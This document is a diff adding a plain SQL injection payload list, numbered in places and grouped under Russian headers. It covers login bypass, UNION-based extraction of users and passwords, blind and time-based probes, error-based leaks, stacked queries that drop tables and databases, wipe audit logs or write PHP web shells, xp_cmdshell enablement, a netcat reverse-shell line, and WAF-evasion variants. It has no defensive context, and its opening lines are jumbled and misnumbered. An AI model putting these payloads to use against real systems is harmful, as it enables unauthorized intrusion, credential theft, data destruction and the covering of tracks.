@@ -1,0 +1,219 @@
+' OR '1'='1'--
+' OR 1=1--                                                 admin'--
+admin' #                                                   ' OR 'a'='a
+' OR ''=''
+' OR 1=1#                                                  ' OR 1=1/*
+admin' OR '1'='1'
+admin'/*
+' UNION SELECT 1, 'admin', 'password'--
+' OR 'one'='one'--
+' OR 'text'='text'
+' OR 'unusual'='unusual'                                   ' OR 'hello'='hello'--
+' OR 'login'='login'--
+' OR 'admin'='admin'--
+' OR 'user'='user'--
+' OR 'name'='name'--
+' OR 'string'='string'--
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT 1, @@version--
+' UNION SELECT 1, database()--
+' UNION SELECT 1, user()--
+' UNION SELECT 1, version()--
+' UNION SELECT NULL, table_name FROM information_schema.tables--
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM users--
+' UNION SELECT NULL, schema_name FROM information_schema.schemata--
+' UNION SELECT 1, load_file('/etc/passwd')--
+' UNION SELECT NULL, NULL, NULL, @@hostname--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT NULL, NULL, CONCAT(username, ':', password) FROM users--
+' UNION ALL SELECT NULL, NULL, NULL--
+' UNION SELECT NULL, NULL FROM dual--
+' UNION SELECT NULL, NULL, NULL, NULL, CURRENT_USER--
+' UNION SELECT NULL, NULL, NULL, NULL, DATABASE()--
+' UNION SELECT NULL, NULL, NULL, NULL, @@datadir--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
+43. `' UNION SELECT 1,@@version,3,4--`
+44. `' UNION SELECT NULL, table_schema, table_name FROM information_schema.tables--`
+45. `' UNION SELECT NULL, NULL, NULL, column_name FROM information_schema.columns--`
+46. `' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, GROUP_CONCAT(table_name) FROM information_schema.tables--`
+47. `' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--`
+48. `' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, GROUP_CONCAT(username, ':', password SEPARATOR '<br>') FROM users--`
+49. `' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, (SELECT @a:=0x0)--`
+50. `' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, (SELECT database())--`
+
+### Категория 3: Слепые инъекции (Blind SQLi - Boolean Based)
+
+51. `' AND 1=1--`
+52. `' AND 1=2--`
+53. `' AND SUBSTRING((SELECT USER()), 1, 1) = 'a'--`
+54. `' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 100--`
+55. `' AND (SELECT COUNT(*) FROM users) > 10--`
+56. `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--`
+57. `' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 10--`
+58. `' AND (SELECT @@version) LIKE '%10%'--`
+59. `' AND EXISTS(SELECT * FROM users WHERE username='admin')--`
+60. `' AND (SELECT user()) = 'root@localhost'--`
+61. `' AND (SELECT ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables LIMIT 1) > 100--`
+62. `' AND (SELECT database()) = 'my_database'--`
+63. `' AND (SELECT IF(1=1, 'a', 'b')) = 'a'--`
+64. `' AND (SELECT IF(1=2, 'a', 'b')) = 'b'--`
+65. `' AND (SELECT MID((SELECT user()),1,1)) = 'r'--`
+66. `' AND (SELECT ORD(MID((SELECT user()),1,1))) = 114--`
+67. `' AND (SELECT CHAR(114)) = 'r'--`
+68. `' AND (SELECT LEFT(database(),1)) = 'm'--`
+69. `' AND (SELECT RIGHT(database(),1)) = 'e'--`
+70. `' AND (SELECT database()) LIKE 'prod%'--`
+
+### Категория 4: Слепые инъекции (Blind SQLi - Time Based)
+
+71. `' OR SLEEP(5)--`
+72. `' AND SLEEP(5)--`
+73. `'; WAITFOR DELAY '00:00:05'--` (MSSQL)
+74. `' OR IF(1=1, SLEEP(5), 0)--`
+75. `' AND IF(1=1, SLEEP(5), 0)--`
+76. `' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--`
+77. `' AND (SELECT BENCHMARK(10000000, MD5('test')))--`
+78. `' OR (SELECT COUNT(*) FROM users) = 10 AND SLEEP(5)--`
+79. `' AND (SELECT ASCII(SUBSTRING((SELECT database()), 1, 1))) = 109 AND SLEEP(5)--`
+80. `'; SELECT pg_sleep(5)--` (PostgreSQL)
+81. `' AND (SELECT dbms_pipe.receive_message(('a'),5) FROM dual)=1--` (Oracle)
+82. `' OR (SELECT dbms_pipe.receive_message(('a'),5) FROM dual) IS NULL--` (Oracle)
+83. `' UNION SELECT SLEEP(5)--`
+84. `' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--`
+85. `' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE database() LIKE 'a%')--`
+86. `' OR IF( (SELECT user()) LIKE 'root%', SLEEP(5), 0)--`
+87. `' AND (SELECT CASE WHEN (username='admin') THEN SLEEP(5) ELSE 0 END FROM users LIMIT 1)--`
+88. `'; DECLARE @v varchar(8000);SELECT @v=db_name();WAITFOR DELAY '00:00:05';--` (MSSQL)
+89. `' OR (SELECT 1 FROM (SELECT pg_sleep(5))a WHERE database()='test')--` (PostgreSQL)
+90. `' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN pg_sleep(5) ELSE pg_sleep(0) END)--` (PostgreSQL)
+
+### Категория 5: Инъекции, основанные на ошибках (Error-Based)
+
+91. `' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT USER())))--` (MySQL)
+92. `' AND UPDATEXML(1, CONCAT(0x5c, (SELECT USER())), 1)--` (MySQL)
+93. `' OR EXP(~(SELECT * FROM (SELECT USER())a))--` (MySQL)
+94. `' AND (SELECT 1/0 FROM dual WHERE (SELECT user FROM dual)='SYS')--` (Oracle)
+95. `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),1)--` (MySQL)
+96. `' OR (SELECT 1 FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--` (MySQL)
+97. `' AND (SELECT * FROM (SELECT NAME_CONST((SELECT USER()),1),NAME_CONST((SELECT USER()),1)) AS x)--`
+98. `' AND ST_LatFromGeoHash((SELECT database()))--` (MySQL)
+99. `' OR (SELECT json_arrayagg((SELECT CONCAT_WS(0x3a,username,password) FROM users)) FROM dual)--` (Oracle)
+100. `'; BEGIN TRY SELECT 1/0 END TRY BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH--` (MSSQL)
+
+### Категория 6: Stacked Queries / Batch Execution
+
+101. `'; DROP TABLE users;--`
+102. `'; UPDATE users SET password='hacked' WHERE username='admin';--`
+103. `'; INSERT INTO users (username, password) VALUES ('attacker', 'password');--`
+104. `'; EXEC xp_cmdshell('dir');--` (MSSQL)
+105. `'; EXEC master..xp_cmdshell 'ping 127.0.0.1';--` (MSSQL)
+106. `'; COPY users TO '/tmp/stolen_data.csv';--` (PostgreSQL)
+107. `'; CREATE TABLE hacked_data (data text);--`
+108. `'; DELETE FROM logs;--`
+109. `'; TRUNCATE TABLE audit_log;--`
+110. `'; GRANT ALL PRIVILEGES ON database.* TO 'attacker'@'%';--`
+111. `'; LOAD_FILE('/etc/passwd');--` (MySQL, требует права)
+112. `'; SELECT * INTO OUTFILE '/var/www/html/backdoor.php' FROM "<?php system($_GET['cmd']); ?>";--` (MySQL, требует права)
+113. `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--` (MSSQL)
+114. `'; DROP DATABASE prod_db;--`
+115. `'; ALTER USER 'admin'@'localhost' IDENTIFIED BY 'newpassword';--`
+116. `'; SHUTDOWN;--` (MSSQL)
+117. `'; DECLARE @cmd INT; EXEC master..sp_oacreate 'wscript.shell', @cmd OUT; EXEC master..sp_oamethod @cmd, 'run', null, 'cmd.exe /c whoami > C:\output.txt';--` (MSSQL)
+118. `'; DO SYSTEM 'nc -e /bin/sh 127.0.0.1 4444';--` (PostgreSQL, требует права)
+119. `'; EXECUTE IMMEDIATE 'SELECT 1 FROM dual';--` (Oracle)
+120. `'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;--` (Oracle)
+
+### Категория 7: Обход фильтров и WAF (Obfuscation)
+
+121. `' OR 1=1--`
+122. `'/**/OR/**/1=1--`
+123. `'%0AOR%0A1=1--` (URL encoded newline)
+124. `'%09OR%091=1--` (URL encoded tab)
+125. `'%0BOR%0B1=1--` (URL encoded vertical tab)
+126. `'/*!50000OR*/ 1=1--` (MySQL version-specific comment)
+127. `' OR '1'='1'`
+128. `' OR '1'='1' /*!30000union*//*!30000select*/ 1,2,3--`
+129. `'UNION%0ASELECT%0ANULL,NULL--`
+130. `' AND (SELECT 1) IS NOT NULL--`
+131. `'%0AUNION%0ASELECT%0A@@version--`
+132. `'/*!UNION*//*!SELECT*/ user(),2,3--`
+133. `' XOR 1=1--` (реже используется)
+134. `' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x31 ELSE 0x28 END))--`
+135. `' DIV 1 AND 1=1--`
+136. `' XOR (SELECT IF(1=1, SLEEP(5), 0))--`
+137. `'%0BUNION%0BSELECT%0BNULL--`
+138. `'%23bla%0AOR 1=1--` (# as URL-encoded comment + newline)
+139. `'%2D%2D%0AOR 1=1--` (-- as URL-encoded + newline)
+140. `'||1=1--` (для конкатенации в Oracle, PostgreSQL)
+
+### Категория 8: Разное и более сложные техники
+
+141. `' OR (SELECT HEX(RANDOMBLOB(1000000000/2)) )--` (SQLite, вызывает задержку)
+142. `' AND (SELECT LOAD_FILE(0x2F6574632F706173737764))--` (MySQL, чтение файла)
+143. `' UNION SELECT NULL,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),NULL--` (постраничный вывод)
+144. `' AND (SELECT 'a' WHERE 1=1)='a'--`
+145. `' AND (SELECT 'a' WHERE 1=2)='a'--` (должно быть ложно)
+146. `' OR (SELECT 1 FROM users WHERE username LIKE '%admin%')--`
+147. `' AND (SELECT CAST(@@version AS INT)) > 10--` (провоцирует ошибку приведения типа)
+148. `' OR SOUNDEX('admin') = SOUNDEX(username)--` (поиск по звучанию)
+149. `' AND (SELECT password FROM users WHERE username='admin') > 'a'--` (сравнение строк)
+150. `' OR (SELECT DIFFERENCE('admin', username) FROM users) > 3--` (MSSQL)
+151. `' UNION SELECT NULL,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),NULL--`
+152. `' AND (SELECT LENGTH(@@version)) > 0--`
+153. `' OR (SELECT QUARTER(CURRENT_TIMESTAMP))=1--`
+154. `' AND (SELECT DAYNAME(CURRENT_DATE)) = 'Monday'--`
+155. `' OR (SELECT CHARSET('test')) = 'utf8'--`
+156. `' AND (SELECT COERCIBILITY('test')) = 4--` (MySQL)
+157. `' OR (SELECT CURRENT_USER()) LIKE '%@%'--`
+158. `' AND (SELECT INET_ATON('127.0.0.1')) = 2130706433--` (MySQL)
+159. `' OR (SELECT JSON_OBJECT('a',1)) = '{"a": 1}'--` (MySQL 5.7+)
+160. `' AND (SELECT TYPEOF(1)) = 'integer'--` (SQLite)
+
+### Категория 9: Использование функций и переменных СУБД
+
+161. `' UNION SELECT NULL,@@version_compile_os,NULL--` (MySQL, ОС)
+162. `' UNION SELECT NULL,@@hostname,NULL--` (MySQL, хостнейм)
+163. `' UNION SELECT NULL,@@tmpdir,NULL--` (MySQL, временная директория)
+164. `' UNION SELECT NULL,user,NULL FROM mysql.user--` (MySQL, пользователи БД)
+165. `' UNION SELECT NULL,plugin,NULL FROM mysql.user WHERE user='root'--` (MySQL, plugin аутентификации)
+166. `' UNION SELECT NULL,global_value,NULL FROM performance_schema.global_variables WHERE variable_name='datadir'--` (MySQL)
+167. `' UNION SELECT NULL,name,NULL FROM master..sysdatabases--` (MSSQL, базы данных)
+168. `' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--` (MSSQL, пользовательские таблицы)
+169. `' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'--` (SQLite)
+170. `' UNION SELECT NULL,privilege,NULL FROM user_tab_privs--` (Oracle)
+171. `' UNION SELECT NULL,banner,NULL FROM v$version--` (Oracle, версия)
+172. `' UNION SELECT NULL,table_name,NULL FROM all_tables--` (Oracle)
+173. `' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--` (Oracle)
+174. `' UNION SELECT NULL,current_setting('data_directory'),NULL--` (PostgreSQL)
+175. `' UNION SELECT NULL,usename,NULL FROM pg_user--` (PostgreSQL, пользователи)
+176. `' UNION SELECT NULL,proname,NULL FROM pg_proc--` (PostgreSQL, процедуры)
+177. `' UNION SELECT NULL,relname,NULL FROM pg_class--` (PostgreSQL, таблицы)
+178. `' UNION SELECT NULL,version(),NULL--` (PostgreSQL)
+179. `' UNION SELECT NULL,getpgusername(),NULL--` (PostgreSQL)
+180. `' UNION SELECT NULL,inet_server_addr(),NULL--` (PostgreSQL, IP сервера)
+
+### Категория 10: Комбинации и продвинутые векторы
+
+181. `' UNION SELECT NULL,(SELECT '<?php system($_GET[\"c\"]); ?>'),NULL INTO OUTFILE '/var/www/shell.php'--`
+182. `'; INSERT INTO users (username, password) VALUES ((SELECT CURRENT_USER()), 'stolen');--`
+183. `' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 100 THEN SLEEP(5) ELSE 0 END)=0--`
+184. `' OR (SELECT LOAD_FILE(0x2F2F6574632F706173737764)) IS NOT NULL--`
+185. `' UNION SELECT NULL,(SELECT variable_value FROM information_schema.global_status WHERE variable_name='Uptime'),NULL--` (MySQL uptime)
+186. `' AND (SELECT CONNECTION_ID())=YOUR_ID--` (MySQL, ID соединения)
+187. `' OR (SELECT FOUND_ROWS()) > 1--` (MySQL)
+188. `' AND (SELECT LAST_INSERT_ID()) > 0--` (MySQL)
+189. `' UNION SELECT NULL,(SELECT CURRVAL('some_sequence')),NULL--` (PostgreSQL, последовательности)
+190. `' OR (SELECT HAS_DATABASE_PRIVILEGE('postgres', 'template1', 'CONNECT'))--` (PostgreSQL)
+191. `' AND (SELECT HAS_TABLE_PRIVILEGE('user', 'users', 'SELECT'))--` (PostgreSQL)
+192. `' UNION SELECT NULL,(SELECT string_agg(table_name, ', ') FROM information_schema.tables),NULL--` (PostgreSQL)
+193. `' OR (SELECT dbms_random.string('A', 10) FROM dual) IS NOT NULL--` (Oracle, рандомная строка)
+194. `' AND (SELECT SYS_CONTEXT('USERENV', 'CURRENT_USER') FROM dual) = 'SCOTT'--` (Oracle)
+195. `' UNION SELECT NULL,(SELECT LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='EMP'),NULL FROM dual--` (Oracle)
+196. `' OR (SELECT EXTRACT(YEAR FROM SYSDATE) FROM dual) = 2023--` (Oracle)
+197. `' AND (SELECT TO_CHAR(SYSDATE, 'DD-MON-YYYY') FROM dual) = '25-AUG-2023'--` (Oracle)
+198. `' UNION SELECT NULL,(SELECT WM_CONCAT(username) FROM users),NULL FROM dual--` (Oracle, старый аналог GROUP_CONCAT)
+199. `' OR (SELECT NVL(some_column, 'default') FROM some_table) = 'value'--` (Oracle, функция NVL)
+200. `' AND (SELECT UID FROM dual) = 1--` (Oracle, ID пользователя)
